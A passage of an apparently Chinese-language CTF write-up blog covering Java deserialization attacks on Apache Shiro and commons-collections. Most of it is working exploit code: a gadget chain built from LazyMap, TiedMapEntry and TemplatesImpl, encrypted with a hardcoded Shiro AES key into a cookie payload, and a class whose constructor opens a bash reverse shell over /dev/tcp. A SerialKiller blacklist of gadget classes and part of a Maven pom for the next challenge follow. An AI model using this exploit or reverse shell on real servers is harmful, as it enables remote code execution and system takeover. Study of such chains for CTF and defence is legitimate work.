</span></span><span style="display:flex;"><span>        Field _tfactory <span style="color:#ff79c6">=</span> c1<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;_tfactory&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        _name<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        _bytecode<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        _tfactory<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        _name<span style="color:#ff79c6">.</span><span style="color:#50fa7b">set</span><span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;h3rmesk1t&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        _bytecode<span style="color:#ff79c6">.</span><span style="color:#50fa7b">set</span><span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> targetByteCode<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        _tfactory<span style="color:#ff79c6">.</span><span style="color:#50fa7b">set</span><span style="color:#ff79c6">(</span>templates<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> TransformerFactoryImpl<span style="color:#ff79c6">());</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> templates<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>注意，那行<code>       Map outerMap = DefaultedMap.decorate(innerMap, new ConstantTransformer(0));</code>其实没有序列化ConstantTransformer，后面会remove掉的</p>
<p>nama的exp，用了LazyMap</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javassist.CannotCompileException<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javassist.ClassPool<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javassist.NotFoundException<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections.Transformer<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections.functors.ConstantTransformer<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections.functors.InstantiateTransformer<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.collections.map.LazyMap<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.shiro.crypto.AesCipherService<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.shiro.util.ByteSource<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.xml.transform.Templates<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.ByteArrayOutputStream<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.IOException<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.ObjectOutputStream<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.Field<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.HashMap<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.Map<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Exp</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span><span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">[]</span> args<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> IOException<span style="color:#ff79c6">,</span> NoSuchFieldException<span style="color:#ff79c6">,</span> IllegalAccessException<span style="color:#ff79c6">,</span> NotFoundException<span style="color:#ff79c6">,</span> CannotCompileException <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> payloads <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Payload<span style="color:#ff79c6">().</span><span style="color:#50fa7b">getPayload</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        AesCipherService aes <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> AesCipherService<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> key <span style="color:#ff79c6">=</span> java<span style="color:#ff79c6">.</span><span style="color:#50fa7b">util</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">Base64</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDecoder</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">decode</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;7Bhs26ccN6i/0AT9GhZULF==&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        ByteSource ciphertext <span style="color:#ff79c6">=</span> aes<span style="color:#ff79c6">.</span><span style="color:#50fa7b">encrypt</span><span style="color:#ff79c6">(</span>payloads<span style="color:#ff79c6">,</span> key<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">printf</span><span style="color:#ff79c6">(</span>ciphertext<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toString</span><span style="color:#ff79c6">());</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Payload</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#50fa7b">Payload</span><span style="color:#ff79c6">(){</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> <span style="color:#50fa7b">getPayload</span><span style="color:#ff79c6">()</span> <span style="color:#8be9fd;font-style:italic">throws</span> IOException<span style="color:#ff79c6">,</span> IllegalAccessException<span style="color:#ff79c6">,</span> NoSuchFieldException<span style="color:#ff79c6">,</span> NotFoundException<span style="color:#ff79c6">,</span> CannotCompileException <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setProperty</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;org.apache.commons.collections.enableUnsafeSerialization&#34;</span><span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;true&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        TemplatesImpl obj <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> TemplatesImpl<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#ff79c6">(</span>obj<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_bytecodes&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[][]</span> <span style="color:#ff79c6">{</span>ClassPool<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDefault</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">get</span><span style="color:#ff79c6">(</span>HelloTemplatesImpl<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">getName</span><span style="color:#ff79c6">()).</span><span style="color:#50fa7b">toBytecode</span><span style="color:#ff79c6">()});</span>
</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#ff79c6">(</span>obj<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_name&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;HelloTemplatesImpl&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#ff79c6">(</span>obj<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;_tfactory&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> TransformerFactoryImpl<span style="color:#ff79c6">());</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Transformer transformer <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> InstantiateTransformer<span style="color:#ff79c6">(</span><span style="color:#ff79c6">new</span> Class<span style="color:#ff79c6">[]</span> <span style="color:#ff79c6">{</span> Templates<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span> <span style="color:#ff79c6">},</span> <span style="color:#ff79c6">new</span> Object<span style="color:#ff79c6">[]</span> <span style="color:#ff79c6">{</span> obj <span style="color:#ff79c6">});</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Transformer fakeTransformer <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ConstantTransformer<span style="color:#ff79c6">(</span>1<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Map innerMap <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> HashMap<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        Map outerMap <span style="color:#ff79c6">=</span> LazyMap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">decorate</span><span style="color:#ff79c6">(</span>innerMap<span style="color:#ff79c6">,</span> fakeTransformer<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        TiedMapEntry tme <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> TiedMapEntry<span style="color:#ff79c6">(</span>outerMap<span style="color:#ff79c6">,</span> TrAXFilter<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        HashMap expmap <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> HashMap<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        expmap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span>tme<span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;xxxxxx&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        outerMap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">clear</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Field f <span style="color:#ff79c6">=</span> LazyMap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;factory&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        f<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        f<span style="color:#ff79c6">.</span><span style="color:#50fa7b">set</span><span style="color:#ff79c6">(</span>outerMap<span style="color:#ff79c6">,</span> transformer<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        ByteArrayOutputStream barr <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ByteArrayOutputStream<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        ObjectOutputStream oos <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ObjectOutputStream<span style="color:#ff79c6">(</span>barr<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">writeObject</span><span style="color:#ff79c6">(</span>expmap<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">close</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> barr<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toByteArray</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">setFieldValue</span><span style="color:#ff79c6">(</span>Object obj<span style="color:#ff79c6">,</span> String name<span style="color:#ff79c6">,</span> Object value<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> NoSuchFieldException<span style="color:#ff79c6">,</span> IllegalAccessException <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        Field fieldName <span style="color:#ff79c6">=</span> obj<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getClass</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">getDeclaredField</span><span style="color:#ff79c6">(</span>name<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        fieldName<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setAccessible</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        fieldName<span style="color:#ff79c6">.</span><span style="color:#50fa7b">set</span><span style="color:#ff79c6">(</span>obj<span style="color:#ff79c6">,</span> value<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">HelloTemplatesImpl</span> <span style="color:#8be9fd;font-style:italic">extends</span> AbstractTranslet <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">transform</span><span style="color:#ff79c6">(</span>DOM document<span style="color:#ff79c6">,</span> SerializationHandler<span style="color:#ff79c6">[]</span> handlers<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">throws</span> TransletException <span style="color:#ff79c6">{}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">transform</span><span style="color:#ff79c6">(</span>DOM document<span style="color:#ff79c6">,</span> DTMAxisIterator iterator<span style="color:#ff79c6">,</span>
</span></span><span style="display:flex;"><span>                          SerializationHandler handler<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> TransletException <span style="color:#ff79c6">{}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#50fa7b">HelloTemplatesImpl</span><span style="color:#ff79c6">()</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">super</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            Runtime r <span style="color:#ff79c6">=</span> Runtime<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getRuntime</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>             Process p <span style="color:#ff79c6">=</span> r<span style="color:#ff79c6">.</span><span style="color:#50fa7b">exec</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">new</span> String<span style="color:#ff79c6">[]{</span><span style="color:#f1fa8c">&#34;/bin/bash&#34;</span><span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;-c&#34;</span><span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#34;</span><span style="color:#ff79c6">});</span>
</span></span><span style="display:flex;"><span>            p<span style="color:#ff79c6">.</span><span style="color:#50fa7b">waitFor</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span><span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>Exception e<span style="color:#ff79c6">){}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><h1 id="tsctf2022mrctf2022-ezjava">tsctf2022(mrctf2022) ezjava</h1>
<p>和上题一样的绕链子</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">&lt;!-- serialkiller.conf --&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;config&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;refresh&gt;</span>6000<span style="color:#ff79c6">&lt;/refresh&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;mode&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">&lt;!-- set to &#39;false&#39; for blocking mode --&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;profiling&gt;</span>false<span style="color:#ff79c6">&lt;/profiling&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/mode&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;logging&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;enabled&gt;</span>false<span style="color:#ff79c6">&lt;/enabled&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/logging&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;blacklist&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">&lt;!-- ysoserial&#39;s CommonsCollections1,3,5,6 payload  --&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;regexp&gt;</span>org\.apache\.commons\.collections\.Transformer$<span style="color:#ff79c6">&lt;/regexp&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;regexp&gt;</span>org\.apache\.commons\.collections\.functors\.InvokerTransformer$<span style="color:#ff79c6">&lt;/regexp&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;regexp&gt;</span>org\.apache\.commons\.collections\.functors\.ChainedTransformer$<span style="color:#ff79c6">&lt;/regexp&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;regexp&gt;</span>org\.apache\.commons\.collections\.functors\.ConstantTransformer$<span style="color:#ff79c6">&lt;/regexp&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;regexp&gt;</span>org\.apache\.commons\.collections\.functors\.InstantiateTransformer$<span style="color:#ff79c6">&lt;/regexp&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">&lt;!-- ysoserial&#39;s CommonsCollections2,4 payload  --&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;regexp&gt;</span>org\.apache\.commons\.collections4\.functors\.InvokerTransformer$<span style="color:#ff79c6">&lt;/regexp&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;regexp&gt;</span>org\.apache\.commons\.collections4\.functors\.ChainedTransformer$<span style="color:#ff79c6">&lt;/regexp&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;regexp&gt;</span>org\.apache\.commons\.collections4\.functors\.ConstantTransformer$<span style="color:#ff79c6">&lt;/regexp&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;regexp&gt;</span>org\.apache\.commons\.collections4\.functors\.InstantiateTransformer$<span style="color:#ff79c6">&lt;/regexp&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;regexp&gt;</span>org\.apache\.commons\.collections4\.comparators\.TransformingComparator$<span style="color:#ff79c6">&lt;/regexp&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/blacklist&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;whitelist&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;regexp&gt;</span>.*<span style="color:#ff79c6">&lt;/regexp&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/whitelist&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/config&gt;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;project</span> <span style="color:#50fa7b">xmlns=</span><span style="color:#f1fa8c">&#34;http://maven.apache.org/POM/4.0.0&#34;</span> <span style="color:#50fa7b">xmlns:xsi=</span><span style="color:#f1fa8c">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span style="display:flex;"><span>         <span style="color:#50fa7b">xsi:schemaLocation=</span><span style="color:#f1fa8c">&#34;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;modelVersion&gt;</span>4.0.0<span style="color:#ff79c6">&lt;/modelVersion&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;parent&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;groupId&gt;</span>org.springframework.boot<span style="color:#ff79c6">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;artifactId&gt;</span>spring-boot-starter-parent<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;version&gt;</span>2.6.5<span style="color:#ff79c6">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;relativePath/&gt;</span> <span style="color:#6272a4">&lt;!-- lookup parent from repository --&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/parent&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;groupId&gt;</span>com.example<span style="color:#ff79c6">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;artifactId&gt;</span>easyJava<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;version&gt;</span>0.0.1-SNAPSHOT<span style="color:#ff79c6">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;name&gt;</span>easyJava<span style="color:#ff79c6">&lt;/name&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;description&gt;</span>easyJava<span style="color:#ff79c6">&lt;/description&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;properties&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;java.version&gt;</span>1.8<span style="color:#ff79c6">&lt;/java.version&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/properties&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;dependencies&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;groupId&gt;</span>org.springframework.boot<span style="color:#ff79c6">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;artifactId&gt;</span>spring-boot-starter-web<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;groupId&gt;</span>org.springframework.boot<span style="color:#ff79c6">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;artifactId&gt;</span>spring-boot-starter-test<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;scope&gt;</span>test<span style="color:#ff79c6">&lt;/scope&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;groupId&gt;</span>org.aspectj<span style="color:#ff79c6">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;artifactId&gt;</span>aspectjweaver<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;version&gt;</span>1.9.5<span style="color:#ff79c6">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;groupId&gt;</span>commons-collections<span style="color:#ff79c6">&lt;/groupId&gt;</span>
